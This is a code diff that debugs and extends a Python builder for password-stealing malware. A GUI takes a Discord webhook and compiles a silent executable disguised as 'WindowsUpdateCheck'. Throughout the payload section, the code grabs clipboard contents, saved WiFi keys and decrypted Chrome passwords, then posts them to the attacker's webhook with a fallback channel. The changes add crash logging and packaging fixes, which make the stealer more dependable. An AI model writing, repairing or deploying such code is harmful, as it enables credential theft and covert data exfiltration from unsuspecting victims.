@@ -14,7 +14,7 @@ import requests
 # =================== WEBHOOK TEST ===================
 def test_webhook(hook):
     try:
-        resp = requests.post(hook, json={"content": "Full stealer test - webhook alive 🔥"}, timeout=10)
+        resp = requests.post(hook, json={"content": "Stealer debug test - webhook alive 🔥"}, timeout=10)
         if resp.status_code in [200, 204]:
             return True, "Webhook working - test message sent."
         else:
@@ -25,8 +25,8 @@ def test_webhook(hook):
 # =================== GUI ===================
 def get_webhook():
     root = tk.Tk()
-    root.title("Full Password Stealer Builder - Fixed Edition")
-    root.geometry("600x320")
+    root.title("Password Stealer Builder - Silent & Debugged")
+    root.geometry("600x350")
     root.resizable(False, False)
     
     tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
@@ -61,9 +61,10 @@ def get_webhook():
             progress.pack_forget()
             messagebox.showinfo("Built", 
                 "stealer.exe ready!\n\n"
-                "Fixed Crypto import crash.\n"
-                "Grabs Chrome passwords (weak pattern filter), WiFi keys, clipboard, full recon.\n"
-                "100% silent, sends JSON file + fallback.")
+                "Fixed silent crash (pywin32 bundling).\n"
+                "Now logs debug to %TEMP%\\stealer_debug.log if anything fails.\n"
+                "Grabs Chrome passwords (weak ones highlighted), WiFi, clipboard, recon.\n"
+                "Sends JSON file + fallback text.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
@@ -73,12 +74,11 @@ def get_webhook():
     tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
     root.mainloop()
 
-# =================== CLEANED STEALER PAYLOAD (NO CRYPTO IMPORT) ===================
+# =================== STEALER PAYLOAD WITH DEBUG LOGGING ===================
 stealer_code = textwrap.dedent('''
 import os
 import json
 import sqlite3
-import win32crypt
 import shutil
 import subprocess
 import requests
@@ -87,6 +87,25 @@ import platform
 import socket
 from datetime import datetime
 import ctypes
+import sys
+
+# Debug logging - writes to temp so you can see crashes
+DEBUG_LOG = os.path.join(os.getenv("TEMP"), "stealer_debug.log")
+def log(msg):
+    try:
+        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
+            f.write(f"[{datetime.now()}] {msg}\\n")
+    except:
+        pass
+
+log("Stealer started")
+
+try:
+    import win32crypt
+    log("win32crypt imported OK")
+except Exception as e:
+    log(f"win32crypt import FAILED: {str(e)}")
+    win32crypt = None
 
 WEBHOOK = "{WEBHOOK_PLACEHOLDER}"
 
@@ -97,6 +116,7 @@ def gather_data():
     data['hostname'] = socket.gethostname()
     data['os'] = platform.platform()
     data['time'] = datetime.now().isoformat()
+    log("Basic recon collected")
 
     # Clipboard
     try:
@@ -109,8 +129,10 @@ def gather_data():
             clipboard_data = ctypes.c_char_p(handle).value.decode('utf-8', errors='ignore')
             data['clipboard'] = clipboard_data
         user32.CloseClipboard()
-    except:
+        log("Clipboard grabbed")
+    except Exception as e:
         data['clipboard'] = "failed"
+        log(f"Clipboard failed: {str(e)}")
 
     # WiFi passwords
     data['wifi'] = []
@@ -125,40 +147,51 @@ def gather_data():
                     data['wifi'].append({profile: key_line[0]})
             except:
                 pass
-    except:
+        log(f"WiFi grabbed: {len(data['wifi'])} networks")
+    except Exception as e:
         data['wifi'] = ["failed"]
+        log(f"WiFi failed: {str(e)}")
 
     # Chrome passwords
     data['chrome_passwords'] = []
-    login_db = f"C:\\\\Users\\\\{user}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"
-    if os.path.exists(login_db):
-        try:
-            temp_db = os.path.join(os.getenv("TEMP"), "LoginTemp")
-            shutil.copy2(login_db, temp_db)
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            for row in cursor.fetchall():
-                url = row[0]
-                username = row[1]
-                encrypted_pw = row[2]
-                try:
-                    decrypted = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
-                    if any(weak in decrypted.lower() for weak in ["possword", "p@ssw0rd", "password", "admin", "1234", "qwerty", "letmein"]):
-                        data['chrome_passwords'].append({"url": url, "user": username, "pass": decrypted})
-                except:
-                    pass
-            conn.close()
-            os.remove(temp_db)
-        except Exception as e:
-            data['chrome_passwords'] = [f"failed: {str(e)}"]
+    if win32crypt:
+        login_db = f"C:\\\\Users\\\\{user}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"
+        if os.path.exists(login_db):
+            try:
+                temp_db = os.path.join(os.getenv("TEMP"), "LoginTemp")
+                shutil.copy2(login_db, temp_db)
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                for row in cursor.fetchall():
+                    url = row[0]
+                    username = row[1]
+                    encrypted_pw = row[2]
+                    try:
+                        decrypted = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
+                        if any(weak in decrypted.lower() for weak in ["possword", "p@ssw0rd", "password", "admin", "1234", "qwerty", "letmein"]):
+                            data['chrome_passwords'].append({"url": url, "user": username, "pass": decrypted})
+                    except Exception as e:
+                        log(f"Decrypt failed on one entry: {str(e)}")
+                conn.close()
+                os.remove(temp_db)
+                log(f"Chrome grabbed: {len(data['chrome_passwords'])} weak passwords")
+            except Exception as e:
+                data['chrome_passwords'] = [f"failed: {str(e)}"]
+                log(f"Chrome overall failed: {str(e)}")
+        else:
+            data['chrome_passwords'] = ["no chrome db"]
+            log("No Chrome Login Data found")
+    else:
+        data['chrome_passwords'] = ["win32crypt unavailable"]
+        log("Chrome skipped due to import fail")
 
     return data
 
 def exfil():
-    payload_json = json.dumps(gather_data(), indent=2)
-    temp_file = os.path.join(os.getenv("TEMP"), "report.json")
     try:
+        payload_json = json.dumps(gather_data(), indent=2)
+        temp_file = os.path.join(os.getenv("TEMP"), "report.json")
         with open(temp_file, "w", encoding="utf-8") as f:
             f.write(payload_json)
         
@@ -166,11 +199,14 @@ def exfil():
             files = {"file": ("grab.json", f)}
             content = {"content": f"**Password Grab** - {getpass.getuser()}@{socket.gethostname()}"}
             requests.post(WEBHOOK, data=content, files=files, timeout=30)
-    except:
+        log("Exfil success (file)")
+    except Exception as e:
+        log(f"Primary exfil failed: {str(e)}")
         try:
-            requests.post(WEBHOOK, json={"content": f"**Fallback**\\n```json\\n{payload_json}\\n```"})
-        except:
-            pass
+            requests.post(WEBHOOK, json={"content": f"**Fallback Grab**\\n```json\\n{payload_json}\\n```"})
+            log("Fallback exfil success")
+        except Exception as e2:
+            log(f"Fallback also failed: {str(e2)}")
     finally:
         try:
             os.remove(temp_file)
@@ -178,13 +214,14 @@ def exfil():
             pass
 
 exfil()
+log("Run complete - check webhook")
 
 while True:
     import time
     time.sleep(3600)
 ''')
 
-# =================== BUILD WITH BULLETPROOF IMPORTS ===================
+# =================== BUILD WITH MAX PYWIN32 HOOKS ===================
 def generate_malware(webhook):
     temp_dir = tempfile.mkdtemp(prefix="build_")
     script_path = os.path.join(temp_dir, "stealer.py")
@@ -198,24 +235,24 @@ def generate_malware(webhook):
         "--noconsole",
         "--name", "WindowsUpdateCheck",
         "--hidden-import", "win32crypt",
+        "--hidden-import", "pywintypes",
+        "--hidden-import", "pythoncom",
         "--hidden-import", "ctypes",
-        "--hidden-import", "ctypes.windll",
         "--collect-all", "win32crypt",
+        "--collect-all", "pywin32",
+        "--collect-submodules", "win32ctypes",
         script_path
     ]
     
     result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
     if result.returncode != 0:
-        raise Exception(f"PyInstaller error:\\n{result.stderr}\\n\\nSTDOUT:\\n{result.stdout}")
+        raise Exception(f"PyInstaller failed hard:\\nSTDERR:\\n{result.stderr}\\n\\nSTDOUT:\\n{result.stdout}")
     
     built_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
     final_exe = os.path.join(os.getcwd(), "stealer.exe")
     shutil.copyfile(built_exe, final_exe)
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Built fixed stealer: {final_exe}")
-
-if __name__ == "__main__":
-    get_webhook()
+    print(f"Bulletproof stealer built: {final_exe}")
 
 if __name__ == "__main__":
     get_webhook()
